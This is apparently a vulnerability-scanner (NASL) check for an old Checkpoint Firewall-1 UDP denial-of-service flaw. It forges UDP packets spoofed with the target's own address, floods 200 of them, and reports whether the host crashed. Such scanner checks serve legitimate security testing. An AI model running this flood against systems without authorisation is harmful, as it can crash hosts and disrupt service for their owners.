if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11905" );
	script_version( "2019-10-29T09:45:45+0000" );
	script_tag( name: "last_modification", value: "2019-10-29 09:45:45 +0000 (Tue, 29 Oct 2019)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 1419 );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:C" );
	script_name( "Checkpoint Firewall-1 UDP denial of service" );
	script_category( ACT_FLOOD );
	script_copyright( "This script is Copyright (C) 2003 Michel Arboi" );
	script_family( "Denial of Service" );
	script_dependencies( "global_settings.sc", "os_detection.sc" );
	script_exclude_keys( "keys/islocalhost", "keys/TARGET_IS_IPV6", "Host/runs_windows" );
	script_tag( name: "solution", value: "If this is a FW-1, enable the antispoofing rule. Otherwise,
  contact your software vendor for a patch." );
	script_tag( name: "impact", value: "An attacker may use this flaw to shut down this server, thus
  preventing you from working properly." );
	script_tag( name: "affected", value: "This attack was known to work against Firewall-1 3.0, 4.0 or 4.1." );
	script_tag( name: "summary", value: "The machine (or a router on the way) crashed when it was flooded by
  incorrect UDP packets." );
	script_tag( name: "solution_type", value: "Mitigation" );
	script_tag( name: "qod_type", value: "remote_probe" );
	exit( 0 );
}
if(TARGET_IS_IPV6()){
	exit( 0 );
}
if(islocalhost()){
	exit( 0 );
}
start_denial();
sleep( 2 );
up = end_denial();
if(!up){
	exit( 0 );
}
id = rand() % 65535 + 1;
sp = rand() % 65535 + 1;
dp = rand() % 65535 + 1;
start_denial();
ip = forge_ip_packet( ip_v: 4, ip_hl: 5, ip_tos: 0, ip_off: 0, ip_p: IPPROTO_UDP, ip_id: id, ip_ttl: 0x40, ip_src: get_host_ip() );
udp = forge_udp_packet( ip: ip, uh_sport: sp, uh_dport: dp, uh_ulen: 8 + 1, data: "X" );
for(i =0; i<200 ;i++){
	send_packet( packet: udp, pcap_active: FALSE );
}
alive = end_denial();
if(!alive){
	security_message( port: 0, proto: "udp" );
	set_kb_item( name: "Host/dead", value: TRUE );
	exit( 0 );
}
exit( 99 );

